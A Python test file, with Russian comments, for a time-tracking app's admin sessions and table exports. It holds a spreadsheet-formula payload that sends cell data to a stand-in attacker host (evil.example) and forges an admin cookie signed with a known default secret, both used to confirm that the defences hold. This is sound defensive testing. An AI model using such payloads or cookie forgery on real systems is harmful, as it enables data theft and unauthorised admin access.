"""Безопасность без БД: сессии админа и экспорт таблиц."""

from __future__ import annotations

import io

import httpx
from itsdangerous import URLSafeTimedSerializer
from openpyxl import load_workbook
from pydantic import SecretStr

from teamtime.api.app import create_app
from teamtime.api.deps import SESSION_COOKIE
from teamtime.core.config import Settings
from teamtime.services.export import Duration, to_csv, to_xlsx

NO_DB = "postgresql+asyncpg://x:x@127.0.0.1:1/x"  # эти запросы базу не трогают


def client(**overrides: object) -> httpx.AsyncClient:
    settings = Settings(database_url=NO_DB, log_level="WARNING", **overrides)  # type: ignore[arg-type]
    app = create_app(settings, realtime=False)
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t/api/v1")


async def is_admin(c: httpx.AsyncClient, cookie: str | None = None) -> bool:
    c.cookies.clear()
    headers = {"Cookie": f"{SESSION_COOKIE}={cookie}"} if cookie else None
    r = await c.get("/auth/me", headers=headers)
    return bool(r.json()["is_admin"])


async def test_cookie_signed_with_public_default_key_is_rejected() -> None:
    """Раньше без SESSION_SECRET ключ был строкой из репозитория — cookie подделывалась."""
    async with client(admin_password=SecretStr("pw")) as c:
        for salt in ("teamtime-admin", "xtime-admin"):
            forged = URLSafeTimedSerializer("dev-insecure-secret-change-me", salt=salt).dumps(
                {"admin": True}
            )
            assert not await is_admin(c, forged)


async def test_session_ends_when_admin_password_changes() -> None:
    secret = SecretStr("same-session-secret")
    async with client(admin_password=SecretStr("old-pw"), session_secret=secret) as c:
        r = await c.post("/auth/login", json={"password": "old-pw"})
        cookie = r.cookies[SESSION_COOKIE]
        assert await is_admin(c, cookie)
    async with client(admin_password=SecretStr("new-pw"), session_secret=secret) as c:
        assert not await is_admin(c, cookie)


async def test_login_rate_limit() -> None:
    async with client(admin_password=SecretStr("pw")) as c:
        codes = [
            (await c.post("/auth/login", json={"password": "wrong"})).status_code for _ in range(6)
        ]
    assert codes == [401] * 5 + [429]


EVIL = '=HYPERLINK("http://evil.example/?d="&A1;"Отчёт")'


def test_csv_export_defuses_formulas() -> None:
    rows = [[EVIL, Duration(-900)], ["+7 999", Duration(0)], ["обычный текст", Duration(60)]]
    lines = to_csv(["Задачи", "Уход"], rows).decode("utf-8-sig").splitlines()[1:]
    assert lines[0].startswith("\"'=HYPERLINK")
    assert lines[0].endswith(";-0:15")  # длительность сервера не трогаем
    assert lines[1] == "'+7 999;0:00"
    assert lines[2] == "обычный текст;0:01"


def test_xlsx_export_stores_formula_like_text_as_text() -> None:
    wb = load_workbook(io.BytesIO(to_xlsx([("Дни", ["Задачи"], [[EVIL]])])))
    cell = wb["Дни"]["A2"]
    assert cell.data_type == "s"
    assert cell.value == EVIL
